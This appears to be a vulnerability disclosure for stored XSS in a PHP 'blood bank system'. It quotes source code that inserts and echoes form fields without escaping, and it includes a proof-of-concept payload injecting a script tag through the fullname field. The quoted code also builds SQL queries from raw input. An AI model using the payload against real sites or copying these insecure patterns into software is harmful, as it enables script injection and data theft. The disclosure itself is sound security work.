# blood-bank-system-in-php-XSS-1

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites:**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

don.php ，bbms.php

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

XSS

## Root Cause

Since the fullname is inserted into the database in don.php, there is no filtering of js code，There is no filtering echo  fullname in the database from bbms.php. 

## Impact

## **Description of the vulnerability**

There is a storage type XSS vulnerability in blood bank system in PHP. via don.php and bbms.php

## don.php

```
$reg="insert into donate (fullname, age,bloodgroup,city,phno,gender) values ('$fullname','$age','$bloodgroup','$city','$phno','$gender')";
$result=mysqli_query($con,$reg);
echo"<script>alert('Your donation request have been registered.Thank you for your kindness. ')</script>";
 }
```

![image-20240919113451679](https://github.com/user-attachments/assets/8212fb7d-26b4-4244-98f7-35f8823cb0cf)

## bbms.php	

![image-20240919113541222](https://github.com/user-attachments/assets/528b5260-9451-475f-9873-8e5b0f7f9bfa)

```
<?php 

session_start();

$conn= mysqli_connect('localhost', 'root', 'root');
mysqli_select_db($conn,'bloodbank');
  $searchq = $_POST['search'];
  $searchqq = $_POST['search2'];
 $statement = "select * from donate where bloodgroup LIKE '%$searchq%' AND city LIKE '%$searchqq%' ";
$result = mysqli_query($conn, $statement);
if(mysqli_num_rows($result)>0)
{
  
     
    while($rows = mysqli_fetch_assoc($result))
  {

    echo "<table style=position:center;width:30cm;>";
     echo "<h1 style=position:relative;>Donor Found Contact him/her</h1>";

    echo "<th>Fullname</th>";
    echo "<th>Bloodgroup You Want</th>";
    echo "<th>Age of Donor</th>";
    echo "<th>Donor City</th>";
    echo "<th>Donor Contact Number</th>";
        echo "<th>Gender</th>";
    echo "</tr>";
    echo "<tr style=position:relative;width:13cm;>";
      $fullname = $rows ['fullname'];
    echo "<td>$fullname</td>";
    echo "<br>";
    $bloodgroup = $rows['bloodgroup'];
    echo "<td>$bloodgroup</td>";
    echo "<br>";
    $age = $rows['age'];
    echo "<td>$age</td>";
    echo "<br>";
    $city = $rows['city'];
    echo "<td>$city</td>";
    echo "<br>";
    $phno = $rows['phno'];
    echo "<td>$phno</td>";
      $gender = $rows['gender'];
    echo "<td>$gender</td>";

    echo "<br>";
    echo "</td>";
    echo "</table>";
	}
}
	 else 
   {
		echo "<script>alert('Donor Not Found')</script>";
    header("Location:js/donate.html");
	}


?>
```

## **Vulnerability recurrence**

### **POC**

Just need to execute the POC and insert the xss code into the database

```
http://bloodbankmgmtsystem/don.php
```

```
fullname=</td><script>alert('xss');</script><td>&age=1&bloodgroup=xss1&city=1&phno=1&gender=1
```

![image-20240921000015162](https://github.com/user-attachments/assets/14356602-79cc-453f-8fe8-cfe5f4addc46)

### Result

We can trigger the XSS vulnerability that was just inserted by accessing the bbms.chp router.

```
http://bloodbankmgmtsystem/bbms.php
```

![image-20240920235844215](https://github.com/user-attachments/assets/2f135fcb-2161-4a12-a3a3-8926ed5331e4)